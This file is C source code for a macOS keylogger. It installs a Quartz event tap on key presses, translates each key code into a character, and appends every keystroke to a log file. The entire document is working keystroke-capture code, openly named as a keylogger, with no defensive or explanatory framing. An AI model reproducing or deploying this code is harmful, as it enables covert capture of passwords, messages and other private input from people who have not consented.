#include "keylogger.h"

int main(int argc, char *argv[]) {

        signal(SIGINT, sigint_handler);

        /*
         * Create a bitmask that identifies the set of events to be observed.
         */
        CGEventMask trackedEvents = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

        /*
         * Creates an event tap.
         */
        CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionDefault, trackedEvents, keyPressed, NULL);

        if(!eventTap) {
                fprintf(stderr, "ERROR: Access for assistive devices must be enabled.");
                exit(1);
        }

        /**
         * A CFRunLoopSource object is an abstraction of an input source (the
         * event tap) that can be put into a run loop.
         */
        CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);

        /**
         * Adds a CFRunLoopSource object to a run loop mode.
         */
        CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);

        logfile = fopen(logfileLocation, "a");

        /**
         * Runs the current thread’s CFRunLoop object in its default mode
         * indefinitely.
         */
        CFRunLoopRun();

        return 0;
}

/**
 * A callback function for the event tap. It is invoked when the event tap
 * receives a Quartz event.
 */
CGEventRef keyPressed(CGEventTapProxy proxy, CGEventType eventType, CGEventRef event, void *userInfo) {
        if (eventType == kCGEventKeyDown || eventType == kCGEventFlagsChanged) {
                CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
                CFStringRef keyStr = createStringForKey(keyCode, 0);

                /**
                 * Returns the maximum number of bytes a string of a specified
                 * length (in Unicode characters) will take up if encoded in a
                 * specified encoding.
                 */
                CFIndex bufferSize = CFStringGetMaximumSizeForEncoding(1, kCFStringEncodingUTF8);
                char charBuffer[bufferSize];

                /**
                 * Copies the character contents of a string to a local C string
                 * buffer after converting the characters to a given encoding.
                 */
                CFStringGetCString(keyStr, charBuffer, bufferSize, kCFStringEncodingUTF8);
                fprintf(logfile, "%s", charBuffer);
                fflush(logfile);

                return event;
        } else {
                return event;
        }
}

/**
 * Accept a keycode and create a CFString for the associated characeter.
 */
CFStringRef createStringForKey(CGKeyCode keyCode, UInt32 shiftKey) {
        TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
        CFDataRef layoutData = TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
        const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);

        UInt32 keysDown = 0;
        UniChar chars[4];
        UniCharCount realLength;

        UCKeyTranslate(keyboardLayout,
                   keyCode,
                   kUCKeyActionDisplay,
                   shiftKey,
                   LMGetKbdType(),
                   kUCKeyTranslateNoDeadKeysBit,
                   &keysDown,
                   sizeof(chars) / sizeof(chars[0]),
                   &realLength,
                   chars);
        CFRelease(currentKeyboard);

        return CFStringCreateWithCharacters(kCFAllocatorDefault, chars, 1);
}
